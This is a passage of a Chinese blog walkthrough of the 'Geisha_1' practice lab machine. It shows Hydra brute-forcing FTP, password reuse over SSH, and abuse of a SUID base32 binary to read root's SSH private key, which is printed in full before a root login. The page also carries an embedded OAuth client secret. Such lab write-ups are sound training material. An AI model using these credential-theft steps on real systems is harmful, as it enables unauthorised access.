+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Geisha_1]<br>└─$ sudo hydra -l geisha -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt 192.1.1.145 ftp<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-29 22:54:37<br>[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 9999 login tries (l:1/p:9999), ~625 tries per task<br>[DATA] attacking ftp://192.1.1.145:21/<br>[21][ftp] host: 192.1.1.145   login: geisha   password: letmein<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-29 22:55:33<br></code></pre></td></tr></table></figure>
+
+<p>使用该密码登录 ftp 成功，进行了简单的文件收集</p>
+<h2 id="密码重用登录ssh"><a href="#密码重用登录ssh" class="headerlink" title="密码重用登录ssh"></a>密码重用登录ssh</h2><p>尝试了一下 ssh 密码是否和 ftp 密码相同</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">geisha@geisha:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> geisha: <br>Sorry, user geisha may not run sudo on geisha.<br>geisha@geisha:~$ <span class="hljs-built_in">uname</span> -a<br>Linux geisha 4.19.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64 GNU/Linux</span><br>geisha@geisha:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:b4:24:08 brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.145/24 brd 192.1.1.255 scope global dynamic ens33<br>       valid_lft 1779sec preferred_lft 1779sec<br>    inet6 fe80::20c:29ff:feb4:2408/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default <br>    <span class="hljs-built_in">link</span>/ether 02:42:b0:73:a4:a9 brd ff:ff:ff:ff:ff:ff<br>    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0<br>       valid_lft forever preferred_lft forever<br>4: br-c987d2b66beb: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default <br>    <span class="hljs-built_in">link</span>/ether 02:42:ee:8e:c2:ab brd ff:ff:ff:ff:ff:ff<br>    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-c987d2b66beb<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::42:eeff:fe8e:c2ab/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>1146: vethfb3bc15@if1145: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-c987d2b66beb state UP group default <br>    <span class="hljs-built_in">link</span>/ether 6a:c7:c5:c3:8c:15 brd ff:ff:ff:ff:ff:ff link-netnsid 0<br>    inet6 fe80::68c7:c5ff:fec3:8c15/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>1148: vethb95d0a1@if1147: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-c987d2b66beb state UP group default <br>    <span class="hljs-built_in">link</span>/ether aa:f4:7a:20:c8:c9 brd ff:ff:ff:ff:ff:ff link-netnsid 1<br>    inet6 fe80::a8f4:7aff:fe20:c8c9/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>geisha@geisha:~$ <span class="hljs-built_in">id</span><br>uid=1000(geisha) gid=1000(geisha) <span class="hljs-built_in">groups</span>=1000(geisha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)<br></code></pre></td></tr></table></figure>
+
+<p>登录成功</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>开始考虑如何提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">geisha@geisha:~$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>  1972743    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign<br>  1972645     52 -rwsr-xr--   1 root     messagebus    51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>  2359743     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>  1969427     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp<br>  1966119     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd<br>  1969808     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount<br>  1969565     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su<br>  1966116     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh<br>  1967637     44 -rwsr-sr-x   1 root     root          43712 Feb 28  2019 /usr/bin/base32<br>  1967184    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 /usr/bin/sudo<br>  1966118     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd<br>  1966115     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn<br>  1969806     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount<br></code></pre></td></tr></table></figure>
+
+<p>看到 base32 是 SUID，看来可以实现任意文件读取，尝试读取了 shadow 文件，但是爆破不出来 root 的密码</p>
+<p>接下来我尝试了检查定时任务、passwd 和 shadow 文件权限、linpeas 结果汇总</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-number">21</span> ftp geisha:letmein<br><span class="hljs-number">22</span> ssh geisha:letmein<br><span class="hljs-number">80</span> Apache  <span class="hljs-regexp">/var/</span>www/html<br><span class="hljs-number">7080</span> LiteSpeed <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lsws/</span>admin/html<br><br><span class="hljs-number">7125</span> <span class="hljs-regexp">/opt/</span>nginx/www<br><span class="hljs-number">9198</span> root python -m SimpleHTTPServer <span class="hljs-number">9198</span><br><br># 利用base32读取了adminpasswd文件<br>base32 <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lsws/</span>adminpasswd | base32 --decode<br>WebAdmin user<span class="hljs-regexp">/password is admin/</span>NTk4MTQ3<br><br>docker-containerd-shim -namespace moby -workdir <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/docker/</span>containerd<span class="hljs-regexp">/daemon/i</span>o.containerd.<span class="hljs-keyword">runtime</span>.v1.linux<span class="hljs-regexp">/moby/</span>d53b34acf079c584129574b2b1925ff972ccc0762b53a872daa55704c2913f9e -address <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/docker/</span>containerd<span class="hljs-regexp">/containerd.sock -containerd-binary /u</span>sr<span class="hljs-regexp">/bin/</span>docker-containerd -<span class="hljs-keyword">runtime</span>-root <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/docker/</span><span class="hljs-keyword">runtime</span>-runc<br><br></code></pre></td></tr></table></figure>
+
+<p>尝试使用得到的密码进行 john 爆破，失败</p>
+<p>由于没有 gcc，所以没考虑内核提权，在这里卡了很久。原本以为的思路是：网站某个路径是可以通过 <code>admin/NTk4MTQ3</code> 来登录进去，或许上传的文件默认是 root 权限，进而反弹 shell 提权。但是并没有找到这样的路径</p>
+<h2 id="base32-SUID-读取-ssh-文件夹中的敏感文件"><a href="#base32-SUID-读取-ssh-文件夹中的敏感文件" class="headerlink" title="base32 SUID 读取 .ssh 文件夹中的敏感文件"></a>base32 SUID 读取 .ssh 文件夹中的敏感文件</h2><p>最后看了 WP，发现是利用 base32 可以实现任意文件读取的特点，尝试读取 root 目录下的 <code>.ssh</code> 文件夹中的敏感文件。这个确实没考虑到，我倒是尝试了直接读取 flag 是成功的（尝试了 root.txt 和 flag.txt）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">geisha@geisha:/etc/ssh$ <span class="hljs-built_in">base32</span> /root/root.txt | <span class="hljs-built_in">base32</span> --decode<br><span class="hljs-built_in">base32</span>: /root/root.txt: No such file or directory<br>geisha@geisha:/etc/ssh$ <span class="hljs-built_in">base32</span> /root/flag.txt | <span class="hljs-built_in">base32</span> --decode<br>Flag&#123;Sun_CTF_220_5_G31sha&#125;<br>geisha@geisha:/etc/ssh$ <span class="hljs-built_in">base32</span> /root/.ssh/id_rsa | <span class="hljs-built_in">base32</span> --decode<br>-----BEGIN RSA PRIVATE KEY-----<br>MIIEpQIBAAKCAQEA43eVw/8oSsnOSPCSyhVEnt01fIwy1YZUpEMPQ8pPkwX5uPh4<br>OZXrITY3JqYSCFcgJS34/TQkKLp7iG2WGmnno/Op4GchXEdSklwoGOKNA22l7pX5<br>89FAL1XSEBCtzlrCrksvfX08+y7tS/I8s41w4aC1TDd5o8c1Kx5lfwl7qw0ZMlbd<br>5yeAUhuxuvxo/KFqiUUfpcpoBf3oT2K97/bZr059VU8T4wd5LkCzKEKmK5ebWIB6<br>fgIfxyhEm/o3dl1lhegTtzC6PtlhuT7ty//mqEeMuipwH3ln61fHXs72LI/vTx26<br>TSSmzHo8zZt+/lwrgroh0ByXbCtDaZjo4HAFfQIDAQABAoIBAQCRXy/b3wpFIcww<br>WW+2rvj3/q/cNU2XoQ4fHKx4yqcocz0xtbpAM0veIeQFU0VbBzOID2V9jQE+9k9U<br>1ZSEtQJRibwbqk1ryDlBSJxnqwIsGrtdS4Q/CpBWsCZcFgy+QMsC0RI8xPlgHpGR<br>Y/LfXZmy2R6E4z9eKEYWlIqRMeJTYgqsP6ZR4SOLuZS1Aq/lq/v9jqGs/SQenjRb<br>8zt1BoqCfOp5TtY1NoBLqaPwmDt8+rlQt1IM+2aYmxdUkLFTcMpCGMADggggtnR+<br>10pZkA6wM8/FlxyAFcNwt+H3xu5VKuQKdqTfh1EuO3c34UmuS1qnidHO1rYWOhYO<br>jceQYzoBAoGBAP/Ml6cp2OWqrheJS9Pgnvz82n+s9yM5raKNnH57j0sbEp++eG7o<br>2po5/vrLBcCHGqZ7+RNFXDmRBEMToru/m2RikSVYk8QHLxVZJt5iB3tcxmglGJj/<br>cLkGM71JqjHX/edwu2nNu14m4l1JV9LGvvHR5m6uU5cQvdcMTsRpkuxdAoGBAOOl<br>THxiQ6R6HkOt9w/WrKDIeGskIXj/P/79aB/2p17M6K+cy75OOYzqkDPENrxK8bub<br>RaTzq4Zl2pAqxvsv/CHuJU/xHs9T3Ox7A1hWqnOOk2f0KBmhQTYBs2OKqXXZotHH<br>xvkOgc0fqRm1QYlCK2lyBBM14O5Isud1ZZXLUOuhAoGBAIBds1z36xiV5nd5NsxE<br>1IQwf5XCvuK2dyQz3Gy8pNQT6eywMM+3mrv6jrJcX66WHhGd9QhurjFVTMY8fFWr<br>edeOfzg2kzC0SjR0YMUIfKizjf2FYCqnRXIUYrKC3R3WPlx+fg5CZ9x/tukJfUEQ<br>65F+vBye7uPISvw3+O8n68shAoGABXMyppOvrONjkBk9Hfr0vRCvmVkPGBd8T71/<br>XayJC0L6myG02wSCajY/Z43eBZoBuY0ZGL7gr2IG3oa3ptHaRnGuIQDTzQDj/CFh<br>zh6dDBEwxD9bKmnq5sEZq1tpfTHNrRoMUHAheWi1orDtNb0Izwh0woT6spm49sOf<br>v/tTH6ECgYEA/tBeKSVGm0UxGrjpQmhW/9Po62JNz6ZBaTELm3paaxqGtA+0HD0M<br>OuzD6TBG6zBF6jW8VLQfiQzIMEUcGa8iJXhI6bemiX6Te1PWC8NMMULhCjObMjCv<br>bf+qz0sVYfPb95SQb4vvFjp5XDVdAdtQov7s7XmHyJbZ48r8ISHm98s=<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Geisha_1]<br>└─$ vim rsakey               <br><br><br>┌──(kali㉿kali)-[~/Downloads/Geisha_1]<br>└─$ <span class="hljs-built_in">chmod</span> 600 rsakey<br><br><br>┌──(kali㉿kali)-[~/Downloads/Geisha_1]<br>└─$ ssh -i rsakey root@192.1.1.145                                                                <br>Linux geisha 4.19.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Sat May  9 12:03:57 2020 from 192.168.1.21<br>root@geisha:~<span class="hljs-comment"># cd /root</span><br>root@geisha:~<span class="hljs-comment"># ls</span><br>flag.txt<br>root@geisha:~<span class="hljs-comment"># whoami</span><br>root<br>root@geisha:~<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:b4:24:08 brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.145/24 brd 192.1.1.255 scope global dynamic ens33<br>       valid_lft 1138sec preferred_lft 1138sec<br>    inet6 fe80::20c:29ff:feb4:2408/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default <br>    <span class="hljs-built_in">link</span>/ether 02:42:b0:73:a4:a9 brd ff:ff:ff:ff:ff:ff<br>    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0<br>       valid_lft forever preferred_lft forever<br>4: br-c987d2b66beb: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default <br>    <span class="hljs-built_in">link</span>/ether 02:42:ee:8e:c2:ab brd ff:ff:ff:ff:ff:ff<br>    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-c987d2b66beb<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::42:eeff:fe8e:c2ab/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>1590: vethdb2139e@if1589: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-c987d2b66beb state UP group default <br>    <span class="hljs-built_in">link</span>/ether 92:cf:34:bd:2d:e9 brd ff:ff:ff:ff:ff:ff link-netnsid 0<br>    inet6 fe80::90cf:34ff:febd:2de9/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>1592: veth4a06cb7@if1591: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-c987d2b66beb state UP group default <br>    <span class="hljs-built_in">link</span>/ether 4a:d7:e0:f7:06:23 brd ff:ff:ff:ff:ff:ff link-netnsid 1<br>    inet6 fe80::48d7:e0ff:fef7:623/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@geisha:~<span class="hljs-comment"># uname -a</span><br>Linux geisha 4.19.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure>
+
+<p>这里如果想不到这个思路，可以翻一翻 autowords 来考虑读取哪些敏感文件</p>
+<p><img src="/pic/022f86227f858f8e0d05b0b9a8a562ac_MD5.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Geisha_1 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/08/9ad2d44c60f1.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/ddeff39afd9a.html" title="DevRandom CTF_1.1 靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DevRandom CTF_1.1 靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/81677a8f4b9c.html" title="loly 靶机">
+                        <span class="hidden-mobile">loly 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'e76dcd9b994fd03dc73c2ba864c37bf5'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
